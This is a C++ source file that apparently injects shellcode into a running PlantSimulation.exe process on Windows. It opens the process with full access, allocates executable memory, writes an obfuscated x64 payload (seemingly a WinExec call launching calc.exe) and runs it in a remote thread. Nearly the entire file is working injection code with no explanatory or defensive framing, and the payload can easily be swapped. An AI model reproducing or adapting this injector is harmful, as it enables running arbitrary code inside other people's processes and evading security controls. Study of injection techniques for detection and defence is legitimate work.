#include <windows.h>
#include <psapi.h>
#include <iostream>

void helloWorld(){
    std::cout << "Hello World !" << std::endl;
}

DWORD GetProcessIdByName(const wchar_t* processName){
    DWORD processIds[1024], bytesReturned;
    if(!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)){
        std::cout << "Failed to enumerate processes, please check your privileges." << std::endl;
        exit(-1);
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);
    for(DWORD i = 0; i < processCount; i++){
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
        if(hProcess){
            wchar_t name[MAX_PATH];
            DWORD nameLen = GetModuleBaseNameW(hProcess, NULL, name, MAX_PATH);
            if(nameLen > 0 && _wcsicmp(name, processName) == 0){
                CloseHandle(hProcess);
                return processIds[i];
            }
            CloseHandle(hProcess);
        }
    }
    return -69;
}

int main(void){
    const char* shellcode = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";
    HANDLE pHandle;
    const wchar_t* processName = L"PlantSimulation.exe";
    if(GetProcessIdByName(processName) != -69){
        if((pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(processName))) != INVALID_HANDLE_VALUE){
            std::wcout << L"Process " << processName << L" was found !" << std::endl;
            LPVOID pRemoteBuffer = VirtualAllocEx(pHandle, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if(!pRemoteBuffer){
                std::wcout << "Couldn't allocate memory in " << processName << std::endl;
                exit(-1);
            }

            std::wcout << L"Allocated 1024 bytes of memory at address " << &pRemoteBuffer << L" in the " << processName << L" process" << std::endl;
            SIZE_T bytesWritten;
            BOOL success = WriteProcessMemory(pHandle, pRemoteBuffer, shellcode, strlen(shellcode), &bytesWritten);
            if(!success || bytesWritten != strlen(shellcode)){
                std::cout << "Failed to write the shellcode to the remote process memory." << std::endl;
                exit(-1);
            }

            std::wcout << L"Wrote shellcode at address " << &pRemoteBuffer << L" in the " << processName << L" process" << std::endl;
            LPVOID pRemoteShellcode = pRemoteBuffer;
            HANDLE hRemoteThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
            if(!hRemoteThread){
                std::cout << "Failed to create remote thread." << std::endl;
                exit(-1);
            }

            std::cout << "Remote thread created successfully" << std::endl;
            WaitForSingleObject(hRemoteThread, INFINITE);
            CloseHandle(hRemoteThread);
            VirtualFreeEx(pHandle, pRemoteBuffer, 0, MEM_RELEASE);
            CloseHandle(pHandle);
        
        } else {
            std::wcout << L"Unable to open " << processName << L" !" << std::endl;
            exit(-1);
        }
    } else {
        std::wcout << L"Process " << processName << L" was not found !" << std::endl;
        exit(-1);
    }
}